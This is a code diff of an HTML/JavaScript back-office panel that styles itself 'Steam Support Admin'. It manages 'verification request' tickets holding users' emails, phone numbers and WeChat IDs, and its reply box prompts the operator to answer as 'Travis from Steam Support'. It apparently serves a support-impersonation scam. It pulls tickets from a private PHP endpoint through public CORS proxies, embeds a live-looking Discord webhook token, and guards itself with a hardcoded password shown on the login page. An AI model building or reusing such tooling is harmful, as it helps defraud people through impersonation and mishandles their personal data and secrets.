@@ -5,463 +5,52 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Steam Support Admin</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
+        /* Все стили остаются такими же как в предыдущей версии */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: #0e141b; color: #c6d4df; min-height: 100vh; }
         
-        body {
-            background: #0e141b;
-            color: #c6d4df;
-            min-height: 100vh;
-        }
+        .login-screen { display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(135deg, #1b2838 0%, #171a21 100%); }
+        .login-box { background: rgba(23, 26, 33, 0.95); padding: 40px; border-radius: 8px; border: 1px solid #2a475e; width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .login-box h2 { color: #66c0f4; margin-bottom: 30px; font-size: 24px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .login-input { width: 100%; padding: 12px 15px; margin: 10px 0; background: rgba(0,0,0,0.3); border: 1px solid #2a475e; border-radius: 4px; color: white; font-size: 14px; }
+        .login-btn { background: linear-gradient(180deg, #5c7e10 0%, #6fa720 100%); color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: bold; margin-top: 20px; width: 100%; }
         
-        /* Login Screen */
-        .login-screen {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background: linear-gradient(135deg, #1b2838 0%, #171a21 100%);
-        }
+        .admin-panel { display: none; height: 100vh; overflow: hidden; }
+        .admin-header { background: linear-gradient(90deg, #171a21 0%, #1b2838 100%); padding: 15px 20px; border-bottom: 1px solid #2a475e; display: flex; justify-content: space-between; align-items: center; }
         
-        .login-box {
-            background: rgba(23, 26, 33, 0.95);
-            padding: 40px;
-            border-radius: 8px;
-            border: 1px solid #2a475e;
-            width: 400px;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-        }
+        .admin-main { display: flex; height: calc(100vh - 70px); }
+        .sidebar { width: 250px; background: rgba(23,26,33,0.9); border-right: 1px solid #2a475e; padding: 20px; }
+        .stats-card { background: rgba(42,71,94,0.3); padding: 15px; border-radius: 6px; margin-bottom: 20px; border: 1px solid #2a475e; }
+        .stats-number { font-size: 28px; font-weight: bold; color: #76ffab; }
         
-        .login-box h2 {
-            color: #66c0f4;
-            margin-bottom: 30px;
-            font-size: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
+        .tickets-list { flex: 1; overflow-y: auto; padding: 20px; background: rgba(0,0,0,0.1); }
+        .ticket-card { background: rgba(23,26,33,0.8); border: 1px solid #2a475e; border-radius: 6px; padding: 15px; margin-bottom: 15px; cursor: pointer; }
+        .ticket-card:hover { border-color: #66c0f4; }
+        .ticket-id { font-family: monospace; color: #66c0f4; font-weight: bold; }
         
-        .login-input {
-            width: 100%;
-            padding: 12px 15px;
-            margin: 10px 0;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid #2a475e;
-            border-radius: 4px;
-            color: white;
-            font-size: 14px;
-            transition: border-color 0.3s;
-        }
+        .chat-panel { width: 400px; background: rgba(23,26,33,0.9); border-left: 1px solid #2a475e; display: flex; flex-direction: column; }
+        .chat-messages { flex: 1; overflow-y: auto; padding: 20px; }
+        .message { margin-bottom: 15px; max-width: 85%; padding: 10px; border-radius: 6px; }
+        .message-user { background: rgba(42,71,94,0.5); border-left: 3px solid #2a475e; margin-right: auto; }
+        .message-admin { background: rgba(92,126,16,0.3); border-right: 3px solid #5c7e10; margin-left: auto; }
         
-        .login-input:focus {
-            outline: none;
-            border-color: #66c0f4;
-        }
+        .chat-input-area { padding: 15px; border-top: 1px solid #2a475e; }
+        .chat-input { width: 100%; padding: 10px; background: rgba(0,0,0,0.3); border: 1px solid #2a475e; border-radius: 4px; color: white; font-size: 13px; resize: none; height: 80px; margin-bottom: 10px; }
+        .send-btn { padding: 10px; background: #66c0f4; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
         
-        .login-btn {
-            background: linear-gradient(180deg, #5c7e10 0%, #6fa720 100%);
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: bold;
-            margin-top: 20px;
-            width: 100%;
-            transition: transform 0.2s;
-        }
+        .loading { text-align: center; padding: 40px; color: #8f98a0; }
+        .spinner { border: 3px solid rgba(102,192,244,0.3); border-top: 3px solid #66c0f4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        .login-btn:hover {
-            transform: translateY(-2px);
-        }
+        .empty-state { text-align: center; padding: 60px 20px; color: #8f98a0; }
+        .hidden { display: none !important; }
+        .api-status { display: inline-flex; align-items: center; gap: 5px; font-size: 12px; padding: 3px 8px; border-radius: 3px; background: rgba(0,0,0,0.2); }
+        .api-online { color: #76ffab; }
+        .api-offline { color: #ff6b6b; }
         
-        /* Admin Panel */
-        .admin-panel {
-            display: none;
-            height: 100vh;
-            overflow: hidden;
-        }
-        
-        /* Header */
-        .admin-header {
-            background: linear-gradient(90deg, #171a21 0%, #1b2838 100%);
-            padding: 15px 20px;
-            border-bottom: 1px solid #2a475e;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
-        }
-        
-        .admin-header h2 {
-            color: #66c0f4;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        /* Main Content */
-        .admin-main {
-            display: flex;
-            height: calc(100vh - 70px);
-        }
-        
-        /* Sidebar */
-        .sidebar {
-            width: 250px;
-            background: rgba(23, 26, 33, 0.9);
-            border-right: 1px solid #2a475e;
-            padding: 20px;
-            overflow-y: auto;
-        }
-        
-        .stats-card {
-            background: rgba(42, 71, 94, 0.3);
-            padding: 15px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            border: 1px solid #2a475e;
-        }
-        
-        .stats-card h3 {
-            color: #66c0f4;
-            font-size: 14px;
-            margin-bottom: 10px;
-        }
-        
-        .stats-number {
-            font-size: 28px;
-            font-weight: bold;
-            color: #76ffab;
-        }
-        
-        .filters {
-            margin-top: 20px;
-        }
-        
-        .filter-btn {
-            width: 100%;
-            padding: 10px;
-            margin: 5px 0;
-            background: rgba(42, 71, 94, 0.3);
-            border: 1px solid #2a475e;
-            color: #c6d4df;
-            border-radius: 4px;
-            cursor: pointer;
-            text-align: left;
-            transition: all 0.2s;
-        }
-        
-        .filter-btn:hover {
-            background: rgba(42, 71, 94, 0.5);
-        }
-        
-        .filter-btn.active {
-            background: #66c0f4;
-            color: white;
-            border-color: #66c0f4;
-        }
-        
-        /* Tickets List */
-        .tickets-list {
-            flex: 1;
-            overflow-y: auto;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.1);
-        }
-        
-        .ticket-card {
-            background: rgba(23, 26, 33, 0.8);
-            border: 1px solid #2a475e;
-            border-radius: 6px;
-            padding: 15px;
-            margin-bottom: 15px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        
-        .ticket-card:hover {
-            border-color: #66c0f4;
-            transform: translateX(5px);
-        }
-        
-        .ticket-card.selected {
-            border-color: #66c0f4;
-            background: rgba(102, 192, 244, 0.1);
-        }
-        
-        .ticket-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 10px;
-        }
-        
-        .ticket-id {
-            font-family: monospace;
-            color: #66c0f4;
-            font-weight: bold;
-        }
-        
-        .ticket-status {
-            padding: 3px 8px;
-            border-radius: 3px;
-            font-size: 11px;
-            font-weight: bold;
-        }
-        
-        .status-pending {
-            background: rgba(255, 184, 32, 0.2);
-            color: #ffb820;
-        }
-        
-        .status-reviewed {
-            background: rgba(102, 192, 244, 0.2);
-            color: #66c0f4;
-        }
-        
-        .status-resolved {
-            background: rgba(92, 126, 16, 0.2);
-            color: #76ffab;
-        }
-        
-        .ticket-info {
-            font-size: 12px;
-            color: #8f98a0;
-            margin: 5px 0;
-        }
-        
-        .ticket-message {
-            font-size: 13px;
-            margin-top: 10px;
-            color: #c6d4df;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        
-        /* Chat Panel */
-        .chat-panel {
-            width: 400px;
-            background: rgba(23, 26, 33, 0.9);
-            border-left: 1px solid #2a475e;
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .chat-header {
-            padding: 15px;
-            border-bottom: 1px solid #2a475e;
-            background: rgba(42, 71, 94, 0.3);
-        }
-        
-        .chat-messages {
-            flex: 1;
-            overflow-y: auto;
-            padding: 20px;
-        }
-        
-        .message {
-            margin-bottom: 15px;
-            max-width: 85%;
-        }
-        
-        .message-user {
-            background: rgba(42, 71, 94, 0.5);
-            border-left: 3px solid #2a475e;
-            margin-right: auto;
-        }
-        
-        .message-admin {
-            background: rgba(92, 126, 16, 0.3);
-            border-right: 3px solid #5c7e10;
-            margin-left: auto;
-        }
-        
-        .message-system {
-            background: rgba(255, 184, 32, 0.1);
-            border: 1px dashed #ffb820;
-            margin: 10px auto;
-            max-width: 90%;
-            text-align: center;
-        }
-        
-        .message-content {
-            padding: 10px;
-            font-size: 13px;
-            white-space: pre-wrap;
-        }
-        
-        .message-info {
-            font-size: 11px;
-            color: #8f98a0;
-            margin-bottom: 3px;
-            padding: 0 10px;
-            display: flex;
-            justify-content: space-between;
-        }
-        
-        .chat-input-area {
-            padding: 15px;
-            border-top: 1px solid #2a475e;
-        }
-        
-        .chat-input {
-            width: 100%;
-            padding: 10px;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid #2a475e;
-            border-radius: 4px;
-            color: white;
-            font-size: 13px;
-            resize: none;
-            height: 80px;
-            margin-bottom: 10px;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        .chat-input:focus {
-            outline: none;
-            border-color: #66c0f4;
-        }
-        
-        .chat-buttons {
-            display: flex;
-            gap: 10px;
-        }
-        
-        .send-btn {
-            flex: 1;
-            padding: 10px;
-            background: #66c0f4;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        
-        .status-select {
-            padding: 10px;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid #2a475e;
-            border-radius: 4px;
-            color: white;
-            min-width: 120px;
-        }
-        
-        /* Loading States */
-        .loading {
-            text-align: center;
-            padding: 40px;
-            color: #8f98a0;
-        }
-        
-        .spinner {
-            border: 3px solid rgba(102, 192, 244, 0.3);
-            border-top: 3px solid #66c0f4;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        /* Empty States */
-        .empty-state {
-            text-align: center;
-            padding: 60px 20px;
-            color: #8f98a0;
-        }
-        
-        .empty-state i {
-            font-size: 48px;
-            margin-bottom: 15px;
-            opacity: 0.5;
-        }
-        
-        /* Scrollbar */
-        ::-webkit-scrollbar {
-            width: 8px;
-        }
-        
-        ::-webkit-scrollbar-track {
-            background: rgba(0, 0, 0, 0.1);
-        }
-        
-        ::-webkit-scrollbar-thumb {
-            background: #2a475e;
-            border-radius: 4px;
-        }
-        
-        ::-webkit-scrollbar-thumb:hover {
-            background: #3d556e;
-        }
-        
-        /* Utility Classes */
-        .hidden {
-            display: none !important;
-        }
-        
-        .api-status {
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-            font-size: 12px;
-            padding: 3px 8px;
-            border-radius: 3px;
-            background: rgba(0, 0, 0, 0.2);
-        }
-        
-        .api-online {
-            color: #76ffab;
-        }
-        
-        .api-offline {
-            color: #ff6b6b;
-        }
-        
-        /* Mobile Responsive */
-        @media (max-width: 1200px) {
-            .chat-panel {
-                position: fixed;
-                right: 0;
-                top: 0;
-                height: 100vh;
-                z-index: 1000;
-                transform: translateX(100%);
-                transition: transform 0.3s;
-            }
-            
-            .chat-panel.open {
-                transform: translateX(0);
-            }
-            
-            .close-chat {
-                position: absolute;
-                top: 10px;
-                right: 10px;
-                background: none;
-                border: none;
-                color: #ff6b6b;
-                font-size: 20px;
-                cursor: pointer;
-                z-index: 1001;
-            }
-        }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.1); }
+        ::-webkit-scrollbar-thumb { background: #2a475e; border-radius: 4px; }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
@@ -474,7 +63,7 @@
             <button onclick="login()" class="login-btn">Login to Admin Panel</button>
             <div style="margin-top: 20px; font-size: 12px; color: #8f98a0;">
                 <p>Default password: <code>steamadmin2024</code></p>
-                <p style="margin-top: 10px;">API Server: <code>http://elita313.beget.tech/api.php</code></p>
+                <p style="margin-top: 10px;">API: <code>http://elita313.beget.tech/api.php</code></p>
             </div>
         </div>
     </div>
@@ -483,13 +72,12 @@
     <div id="adminPanel" class="admin-panel">
         <!-- Header -->
         <div class="admin-header">
-            <h2><i class="fas fa-tools"></i> Steam Support Ticket System</h2>
+            <h2><i class="fas fa-tools"></i> Steam Support Tickets</h2>
             <div style="display: flex; align-items: center; gap: 15px;">
                 <span class="api-status" id="apiStatus">
                     <i class="fas fa-circle"></i>
                     <span id="apiStatusText">Checking...</span>
                 </span>
-                <span id="adminName">Admin: Travis</span>
                 <button onclick="logout()" style="background: #c34242; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-size: 13px;">
                     <i class="fas fa-sign-out-alt"></i> Logout
                 </button>
@@ -515,30 +103,15 @@
                     <div class="stats-number" id="resolvedTickets">0</div>
                 </div>
                 
-                <div class="filters">
-                    <button class="filter-btn active" onclick="setFilter('all')">
-                        <i class="fas fa-list"></i> All Tickets
+                <div style="margin-top: 20px;">
+                    <button onclick="loadTickets()" style="width: 100%; padding: 10px; background: #2a475e; color: white; border: none; border-radius: 4px; cursor: pointer;">
+                        <i class="fas fa-sync-alt"></i> Refresh Tickets
                     </button>
-                    <button class="filter-btn" onclick="setFilter('pending')">
-                        <i class="fas fa-clock"></i> Pending
-                    </button>
-                    <button class="filter-btn" onclick="setFilter('resolved')">
-                        <i class="fas fa-check-circle"></i> Resolved
-                    </button>
-                    <button class="filter-btn" onclick="setFilter('server')">
-                        <i class="fas fa-server"></i> From Server
-                    </button>
-                    
-                    <div style="margin-top: 20px;">
-                        <button onclick="refreshTickets()" style="width: 100%; padding: 10px; background: #2a475e; color: white; border: none; border-radius: 4px; cursor: pointer;">
-                            <i class="fas fa-sync-alt"></i> Refresh
-                        </button>
-                    </div>
-                    
-                    <div style="margin-top: 10px; font-size: 11px; color: #8f98a0; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 4px;">
-                        <p><strong>Server URL:</strong></p>
-                        <p style="word-break: break-all; margin-top: 5px;">http://elita313.beget.tech/api.php</p>
-                    </div>
+                </div>
+                
+                <div style="margin-top: 20px; font-size: 12px; color: #8f98a0; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 4px;">
+                    <p><strong>Mode:</strong> <span id="modeText">Loading...</span></p>
+                    <p style="margin-top: 5px; word-break: break-all;" id="apiInfo">API: Checking...</p>
                 </div>
             </div>
             
@@ -548,17 +121,12 @@
                     <div class="spinner"></div>
                     <p>Loading tickets...</p>
                 </div>
-                <!-- Tickets will be loaded here -->
             </div>
             
             <!-- Chat Panel -->
             <div class="chat-panel" id="chatPanel">
-                <button class="close-chat hidden" onclick="closeChat()" id="closeChatBtn">
-                    <i class="fas fa-times"></i>
-                </button>
-                
-                <div class="chat-header">
-                    <h3 id="chatTitle">Select a ticket to chat</h3>
+                <div class="chat-header" style="padding: 15px; border-bottom: 1px solid #2a475e; background: rgba(42,71,94,0.3);">
+                    <h3 id="chatTitle">Select a ticket</h3>
                     <div style="font-size: 12px; color: #8f98a0; margin-top: 5px;">
                         <span id="chatTicketId">-</span>
                         <span style="margin-left: 10px;">Status: <span id="chatStatus">-</span></span>
@@ -573,15 +141,15 @@
                 </div>
                 
                 <div class="chat-input-area" id="chatInputArea" style="display: none;">
-                    <textarea class="chat-input" id="messageInput" placeholder="Type your response as Travis from Steam Support..."></textarea>
-                    <div class="chat-buttons">
-                        <select class="status-select" id="statusSelect">
+                    <textarea class="chat-input" id="messageInput" placeholder="Type response as Steam Support..."></textarea>
+                    <div style="display: flex; gap: 10px;">
+                        <select id="statusSelect" style="padding: 10px; background: rgba(0,0,0,0.3); border: 1px solid #2a475e; border-radius: 4px; color: white; min-width: 120px;">
                             <option value="pending">Pending</option>
-                            <option value="reviewed">Under Review</option>
+                            <option value="reviewed">Reviewed</option>
                             <option value="resolved">Resolved</option>
                         </select>
-                        <button class="send-btn" onclick="sendMessage()">
-                            <i class="fas fa-paper-plane"></i> Send
+                        <button class="send-btn" onclick="sendMessage()" style="flex: 1;">
+                            <i class="fas fa-paper-plane"></i> Send Response
                         </button>
                     </div>
                 </div>
@@ -590,45 +158,41 @@
     </div>
 
     <script>
-        // Configuration
-        const API_SERVER = 'http://elita313.beget.tech/api.php';
+        // Конфигурация - ТОЧНО ТАКАЯ ЖЕ КАК В INDEX.HTML
+        const API_CONFIG = {
+            mainApi: 'http://elita313.beget.tech/api.php',
+            // Те же прокси что использует index.html
+            proxyUrls: [
+                'https://corsproxy.io/?',
+                'https://api.allorigins.win/raw?url=',
+                'https://proxy.cors.sh/',
+                '' // Пустая строка для прямого запроса
+            ],
+            discordWebhook: 'https://discord.com/api/webhooks/1465641089146032221/rwlhhe7jcZArcETKrbODEsd7FbEc_02I4BoSG9pYsnlKusnGAA-X3MmfnZePitANlSAk'
+        };
+        
         const ADMIN_PASSWORD = 'steamadmin2024';
         
-        // State
+        // Состояние
         let tickets = [];
-        let serverTickets = [];
         let selectedTicketId = null;
-        let currentFilter = 'all';
-        let isApiOnline = false;
+        let currentApiStatus = false;
+        let currentProxyIndex = 0;
         
-        // Initialize
+        // Инициализация
         document.addEventListener('DOMContentLoaded', function() {
-            // Check if already logged in
+            // Проверка логина
             if (localStorage.getItem('steam_admin_logged_in') === 'true') {
                 showAdminPanel();
-            } else {
-                showLoginScreen();
             }
             
-            // Check for ticket parameter in URL
+            // Проверка параметра в URL
             const urlParams = new URLSearchParams(window.location.search);
             const ticketId = urlParams.get('ticket');
             if (ticketId && localStorage.getItem('steam_admin_logged_in') === 'true') {
                 setTimeout(() => selectTicket(ticketId), 1000);
             }
         });
-        
-        function showLoginScreen() {
-            document.getElementById('loginScreen').style.display = 'flex';
-            document.getElementById('adminPanel').style.display = 'none';
-        }
-        
-        function showAdminPanel() {
-            document.getElementById('loginScreen').style.display = 'none';
-            document.getElementById('adminPanel').style.display = 'block';
-            checkApiStatus();
-            loadTickets();
-        }
         
         function login() {
             const password = document.getElementById('adminPassword').value;
@@ -637,7 +201,7 @@
                 localStorage.setItem('steam_admin_logged_in', 'true');
                 showAdminPanel();
             } else {
-                alert('Incorrect password! Default: steamadmin2024');
+                alert('Incorrect password! Use: steamadmin2024');
             }
         }
         
@@ -646,73 +210,130 @@
             location.reload();
         }
         
-        async function checkApiStatus() {
+        function showAdminPanel() {
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('adminPanel').style.display = 'block';
+            checkApiConnection();
+            loadTickets();
+        }
+        
+        // ТОЧНО ТАКОЙ ЖЕ МЕТОД КАК В INDEX.HTML
+        async function checkApiConnection() {
             const statusElement = document.getElementById('apiStatus');
             const statusText = document.getElementById('apiStatusText');
+            const modeText = document.getElementById('modeText');
+            const apiInfo = document.getElementById('apiInfo');
+            
+            // Пробуем все прокси по очереди
+            for (let i = 0; i < API_CONFIG.proxyUrls.length; i++) {
+                try {
+                    const proxy = API_CONFIG.proxyUrls[i];
+                    const url = proxy + encodeURIComponent(API_CONFIG.mainApi + '?action=test');
+                    
+                    console.log(`Trying API connection via: ${proxy || 'direct'}`);
+                    
+                    const response = await fetch(url, {
+                        method: 'GET',
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    });
+                    
+                    if (response.ok) {
+                        const data = await response.json();
+                        if (data.success) {
+                            currentApiStatus = true;
+                            currentProxyIndex = i;
+                            
+                            statusText.textContent = 'API Online';
+                            statusElement.className = 'api-status api-online';
+                            
+                            const proxyName = proxy.includes('corsproxy') ? 'CORS Proxy' : 
+                                            proxy.includes('allorigins') ? 'AllOrigins' : 
+                                            proxy.includes('proxy.cors') ? 'CORS.SH' : 
+                                            'Direct';
+                            
+                            modeText.textContent = proxyName;
+                            apiInfo.textContent = `API: Connected via ${proxyName}`;
+                            
+                            console.log(`API connected via ${proxyName}`);
+                            return true;
+                        }
+                    }
+                } catch (error) {
+                    console.log(`Proxy ${i} failed:`, error);
+                    continue;
+                }
+            }
+            
+            // Все прокси не работают - оффлайн режим
+            currentApiStatus = false;
+            statusText.textContent = 'Offline Mode';
+            statusElement.className = 'api-status api-offline';
+            modeText.textContent = 'Local Storage';
+            apiInfo.textContent = 'API: Using local data only';
+            
+            console.log('All API connections failed, using offline mode');
+            return false;
+        }
+        
+        // Универсальный метод отправки запросов (как в index.html)
+        async function apiRequest(action, data = null, ticketId = null) {
+            const params = new URLSearchParams();
+            params.append('action', action);
+            if (ticketId) params.append('ticket_id', ticketId);
+            
+            const url = API_CONFIG.mainApi + '?' + params.toString();
+            const proxy = API_CONFIG.proxyUrls[currentProxyIndex] || '';
             
             try {
-                const response = await fetch(`${API_SERVER}?action=test`, {
-                    method: 'GET',
-                    mode: 'cors',
+                const requestUrl = proxy + encodeURIComponent(url);
+                const options = {
+                    method: data ? 'POST' : 'GET',
                     headers: {
-                        'Accept': 'application/json'
+                        'Accept': 'application/json',
+                        'Content-Type': 'application/json'
                     }
-                });
+                };
+                
+                if (data) {
+                    options.body = JSON.stringify(data);
+                }
+                
+                const response = await fetch(requestUrl, options);
                 
                 if (response.ok) {
-                    const data = await response.json();
-                    if (data.success) {
-                        statusText.textContent = 'API Online';
-                        statusElement.className = 'api-status api-online';
-                        isApiOnline = true;
-                        return true;
-                    }
+                    return await response.json();
                 }
             } catch (error) {
-                console.log('Direct API connection failed');
+                console.log(`API request failed: ${action}`, error);
+                throw error;
             }
             
-            // Try with CORS proxy
-            try {
-                const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(API_SERVER + '?action=test')}`;
-                const response = await fetch(proxyUrl);
-                
-                if (response.ok) {
-                    statusText.textContent = 'API Online (via proxy)';
-                    statusElement.className = 'api-status api-online';
-                    isApiOnline = true;
-                    return true;
-                }
-            } catch (proxyError) {
-                console.log('Proxy connection failed');
-            }
-            
-            // Offline
-            statusText.textContent = 'API Offline';
-            statusElement.className = 'api-status api-offline';
-            isApiOnline = false;
-            return false;
+            return null;
         }
         
         async function loadTickets() {
             const loadingElement = document.getElementById('loadingTickets');
             loadingElement.style.display = 'block';
             
-            // Load from localStorage first
+            // Всегда загружаем из localStorage
             loadLocalTickets();
             
-            // Try to load from server
-            if (isApiOnline) {
-                await loadServerTickets();
+            // Пробуем загрузить с сервера если API доступен
+            if (currentApiStatus) {
+                try {
+                    const serverData = await apiRequest('get_tickets');
+                    if (serverData && serverData.success) {
+                        mergeServerTickets(serverData.tickets || []);
+                    }
+                } catch (error) {
+                    console.log('Failed to load from server, using local data');
+                }
             }
             
-            // Merge tickets
-            mergeTickets();
-            
-            // Update stats
+            // Обновляем статистику и отображаем
             updateStats();
-            
-            // Render tickets
             renderTickets();
             
             loadingElement.style.display = 'none';
@@ -721,64 +342,27 @@
         function loadLocalTickets() {
             const localTickets = JSON.parse(localStorage.getItem('steam_tickets') || '[]');
             
-            // If no tickets in localStorage, create sample data
             if (localTickets.length === 0) {
+                // Создаем демо данные если нет сохраненных
                 tickets = [
                     {
-                        id: 'S-7834592',
-                        email: 'user1@example.com',
-                        phone: '+1 *** *** 8562',
-                        wechat: 'wxid_3980p3aon2ju12',
+                        id: 'S-' + Math.floor(1000000 + Math.random() * 9000000),
+                        email: 'demo@example.com',
+                        phone: '+1 234 567 8900',
+                        wechat: 'Not provided',
                         created_at: new Date().toISOString(),
                         updated_at: new Date().toISOString(),
                         status: 'pending',
                         messages: [
                             {
                                 sender: 'user',
-                                message: "Hi, I can't find my purchase receipts. My WeChat is wxid_3980p3aon2ju12",
+                                message: 'Test verification request',
                                 timestamp: new Date().toISOString()
                             },
                             {
                                 sender: 'support',
-                                message: "Hi there,\n\nThank you for contacting Steam Support. We've received your verification request.\n\nSteam Support\nTravis",
+                                message: 'Thank you for contacting Steam Support. We are reviewing your request.\n\nTravis',
                                 timestamp: new Date().toISOString()
-                            }
-                        ]
-                    },
-                    {
-                        id: 'S-8923451',
-                        email: 'user2@gmail.com',
-                        phone: '+44 7911 123456',
-                        wechat: 'Not provided',
-                        created_at: new Date(Date.now() - 86400000).toISOString(), // 1 day ago
-                        updated_at: new Date(Date.now() - 43200000).toISOString(), // 12 hours ago
-                        status: 'reviewed',
-                        messages: [
-                            {
-                                sender: 'user',
-                                message: "I need help with my account verification",
-                                timestamp: new Date(Date.now() - 86400000).toISOString()
-                            }
-                        ]
-                    },
-                    {
-                        id: 'S-4561237',
-                        email: 'user3@hotmail.com',
-                        phone: '+81 90 1234 5678',
-                        wechat: 'wxid_test123',
-                        created_at: new Date(Date.now() - 172800000).toISOString(), // 2 days ago
-                        updated_at: new Date(Date.now() - 86400000).toISOString(), // 1 day ago
-                        status: 'resolved',
-                        messages: [
-                            {
-                                sender: 'user',
-                                message: "Account recovery request",
-                                timestamp: new Date(Date.now() - 172800000).toISOString()
-                            },
-                            {
-                                sender: 'support',
-                                message: "Your account has been successfully verified.\n\nSteam Support\nTravis",
-                                timestamp: new Date(Date.now() - 86400000).toISOString()
                             }
                         ]
                     }
@@ -790,52 +374,29 @@
             }
         }
         
-        async function loadServerTickets() {
-            try {
-                const response = await fetch(`${API_SERVER}?action=get_tickets`, {
-                    method: 'GET',
-                    mode: 'cors',
-                    headers: {
-                        'Accept': 'application/json'
-                    }
-                });
-                
-                if (response.ok) {
-                    const data = await response.json();
-                    if (data.success && data.tickets) {
-                        serverTickets = data.tickets;
-                        return true;
-                    }
-                }
-            } catch (error) {
-                console.log('Failed to load tickets from server');
-            }
-            
-            return false;
-        }
-        
-        function mergeTickets() {
-            // Merge server tickets with local tickets
+        function mergeServerTickets(serverTickets) {
             serverTickets.forEach(serverTicket => {
                 const existingIndex = tickets.findIndex(t => t.id === serverTicket.id);
                 
                 if (existingIndex === -1) {
-                    // New ticket from server
+                    // Новый тикет с сервера
                     tickets.push({
                         ...serverTicket,
                         source: 'server'
                     });
                 } else {
-                    // Update existing ticket with server data
+                    // Обновляем существующий
                     tickets[existingIndex] = {
                         ...tickets[existingIndex],
                         ...serverTicket,
                         source: 'server',
-                        // Keep local messages if server doesn't have them
                         messages: serverTicket.messages || tickets[existingIndex].messages
                     };
                 }
             });
+            
+            // Сохраняем объединенные данные
+            localStorage.setItem('steam_tickets', JSON.stringify(tickets));
         }
         
         function updateStats() {
@@ -848,155 +409,122 @@
             document.getElementById('resolvedTickets').textContent = resolved;
         }
         
-        function setFilter(filter) {
-            currentFilter = filter;
-            
-            // Update active button
-            document.querySelectorAll('.filter-btn').forEach(btn => {
-                btn.classList.remove('active');
-            });
-            event.target.classList.add('active');
-            
-            renderTickets();
-        }
-        
         function renderTickets() {
             const container = document.getElementById('ticketsList');
             const loadingElement = document.getElementById('loadingTickets');
             
-            // Hide loading
             loadingElement.style.display = 'none';
             
-            // Filter tickets
-            let filteredTickets = tickets;
+            // Сортируем по дате (новые сверху)
+            const sortedTickets = [...tickets].sort((a, b) => 
+                new Date(b.updated_at) - new Date(a.updated_at)
+            );
             
-            if (currentFilter === 'pending') {
-                filteredTickets = tickets.filter(t => t.status === 'pending');
-            } else if (currentFilter === 'resolved') {
-                filteredTickets = tickets.filter(t => t.status === 'resolved');
-            } else if (currentFilter === 'server') {
-                filteredTickets = tickets.filter(t => t.source === 'server');
-            }
-            
-            // Sort by date (newest first)
-            filteredTickets.sort((a, b) => new Date(b.updated_at) - new Date(a.updated_at));
-            
-            // Clear container
             container.innerHTML = '';
             
-            if (filteredTickets.length === 0) {
+            if (sortedTickets.length === 0) {
                 container.innerHTML = `
                     <div class="empty-state">
                         <i class="fas fa-inbox"></i>
                         <p>No tickets found</p>
-                        ${currentFilter === 'server' ? '<p style="font-size: 12px; margin-top: 10px;">Try connecting to the server</p>' : ''}
+                        <p style="font-size: 12px; margin-top: 10px;">Submit a verification request first</p>
                     </div>
                 `;
                 return;
             }
             
-            // Create ticket cards
-            filteredTickets.forEach(ticket => {
+            sortedTickets.forEach(ticket => {
                 const card = document.createElement('div');
                 card.className = `ticket-card ${selectedTicketId === ticket.id ? 'selected' : ''}`;
                 card.onclick = () => selectTicket(ticket.id);
                 
-                // Get last message preview
-                const lastMessage = ticket.messages && ticket.messages.length > 0 
-                    ? ticket.messages[ticket.messages.length - 1].message
+                // Получаем последнее сообщение
+                const lastMsg = ticket.messages && ticket.messages.length > 0 
+                    ? ticket.messages[ticket.messages.length - 1] 
+                    : null;
+                
+                const messagePreview = lastMsg 
+                    ? (lastMsg.message.length > 60 
+                        ? lastMsg.message.substring(0, 60) + '...' 
+                        : lastMsg.message)
                     : 'No messages';
                 
-                const messagePreview = lastMessage.length > 80 
-                    ? lastMessage.substring(0, 80) + '...' 
-                    : lastMessage;
